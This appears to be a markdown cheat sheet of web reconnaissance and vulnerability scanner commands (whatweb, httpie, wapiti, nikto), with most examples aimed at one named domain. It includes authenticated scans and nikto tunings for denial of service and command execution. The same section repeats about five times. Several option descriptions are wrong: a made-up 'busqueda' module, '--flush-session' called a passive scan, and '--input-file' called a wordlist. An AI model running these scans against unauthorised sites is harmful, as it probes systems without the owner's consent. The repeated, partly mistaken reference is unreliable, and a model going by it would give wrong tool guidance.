- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
